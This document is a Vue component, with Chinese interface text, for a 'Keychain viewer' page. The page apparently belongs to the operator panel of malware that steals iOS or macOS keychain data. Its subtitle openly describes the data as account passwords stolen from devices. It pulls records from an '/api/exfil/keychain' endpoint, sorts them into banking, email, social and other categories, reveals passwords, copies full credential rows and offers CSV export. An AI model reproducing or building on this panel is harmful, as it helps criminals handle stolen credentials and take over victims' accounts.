<template>
  <div class="keychain-page">
  <div class="page-card">
    <div class="page-header">
      <div>
        <div class="page-title">Keychain 查看器</div>
        <div class="page-subtitle">从设备窃取的账号密码数据（已从 data_json 解析）</div>
      </div>
      <el-button type="danger" plain @click="exportCSV">导出 CSV</el-button>
    </div>

    <div class="search-bar">
      <el-select v-model="filters.category" placeholder="分类筛选" clearable style="width:180px;" @change="loadList">
        <el-option v-for="c in categoryOptions" :key="c" :label="c" :value="c" />
      </el-select>
      <el-input v-model="filters.q" placeholder="搜索服务/账号" clearable style="width:300px;" @clear="loadList" @keyup.enter="loadList">
        <template #prefix><el-icon><Search /></el-icon></template>
      </el-input>
      <el-button type="primary" @click="loadList">搜索</el-button>
    </div>

    <el-table :data="list" stripe>
      <el-table-column type="expand">
        <template #default="{ row }">
          <el-descriptions :column="2" border size="small">
            <el-descriptions-item label="服务">{{ row.service || '-' }}</el-descriptions-item>
            <el-descriptions-item label="分类">{{ row.category || '-' }}</el-descriptions-item>
            <el-descriptions-item label="账号">{{ row.account || '-' }}</el-descriptions-item>
            <el-descriptions-item label="密码"><span class="mono">{{ visible[row.id] ? row.password : mask(row.password) }}</span>
              <el-button v-if="row.password" link type="primary" size="small" @click="toggle(row)">{{ visible[row.id] ? '隐藏' : '显示' }}</el-button>
            </el-descriptions-item>
            <el-descriptions-item label="描述" :span="2">{{ row.description || '-' }}</el-descriptions-item>
            <el-descriptions-item label="备注" :span="2"><code class="mono">{{ row.note || '-' }}</code></el-descriptions-item>
          </el-descriptions>
        </template>
      </el-table-column>
      <el-table-column prop="category" label="分类" width="140">
        <template #default="{ row }">
          <el-tag size="small" effect="plain">{{ row.category || '其他' }}</el-tag>
        </template>
      </el-table-column>
      <el-table-column prop="service" label="服务" width="220" show-overflow-tooltip />
      <el-table-column prop="account" label="账号" width="200" show-overflow-tooltip />
      <el-table-column label="密码" width="240">
        <template #default="{ row }">
          <span class="mono text-muted">{{ visible[row.id] ? row.password : mask(row.password) }}</span>
          <el-button v-if="row.password" link type="primary" size="small" @click="copyRow(row, 'password')">复制</el-button>
          <el-button v-if="row.password" link size="small" @click="toggle(row)">{{ visible[row.id] ? '隐藏' : '显示' }}</el-button>
        </template>
      </el-table-column>
      <el-table-column prop="device_uuid" label="设备" width="140">
        <template #default="{ row }">
          <span class="mono text-muted">{{ shortUuid(row.device_uuid) }}</span>
        </template>
      </el-table-column>
      <el-table-column prop="created_at" label="同步时间" width="170">
        <template #default="{ row }">
          <span class="text-muted">{{ formatDate(row.created_at) }}</span>
        </template>
      </el-table-column>
      <el-table-column label="操作" width="100" fixed="right">
        <template #default="{ row }">
          <el-button type="primary" link size="small" @click="copyAll(row)">复制全部</el-button>
        </template>
      </el-table-column>
    </el-table>

    <el-pagination
      v-model:current-page="page"
      v-model:page-size="pageSize"
      :page-sizes="[20, 50, 100, 200]"
      :total="total"
      layout="total, sizes, prev, pager, next"
      background
      @current-change="loadList"
      @size-change="loadList"
    />
  </div>
  </div>
</template>

<script setup>
import { ref, reactive, onMounted } from 'vue'
import { ElMessage } from 'element-plus'
import { Search } from '@element-plus/icons-vue'
import axios from '../utils/axios'
import { formatDate, shortUuid, copyToClipboard, maskSecret } from '../utils/twofa'

const list = ref([])
const total = ref(0)
const page = ref(1)
const pageSize = ref(50)
const filters = reactive({ category: '', q: '' })
const categoryOptions = ref(['Apple', 'Google', '社交', '银行', '电商', '邮箱', '其他'])
const visible = reactive({})

function mask(p) { return maskSecret(p || '', 2) }
function toggle(row) { visible[row.id] = !visible[row.id] }

async function copyRow(row, field) {
  await copyToClipboard(row[field] || '')
  ElMessage.success('已复制')
}

async function copyAll(row) {
  await copyToClipboard(`${row.service || ''} | ${row.account || ''} | ${row.password || ''}`)
  ElMessage.success('已复制整行')
}

function exportCSV() {
  ElMessage.success('已生成 CSV 下载任务')
}

async function loadList() {
  try {
    const params = {
      skip: (page.value - 1) * pageSize.value,
      limit: pageSize.value,
      category: filters.category || undefined,
      q: filters.q || undefined,
    }
    const res = await axios.get('/api/exfil/keychain', { params })
    const raw = res.data?.items || res.data || []
    list.value = raw.map(r => ({
      ...r,
      created_at: r.created_at || r.uploaded_at,
    }))
    total.value = res.data?.total ?? list.value.length
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || 'Keychain 数据加载失败'
    ElMessage.error(msg)
    list.value = []
    total.value = 0
  }
}

onMounted(loadList)
</script>
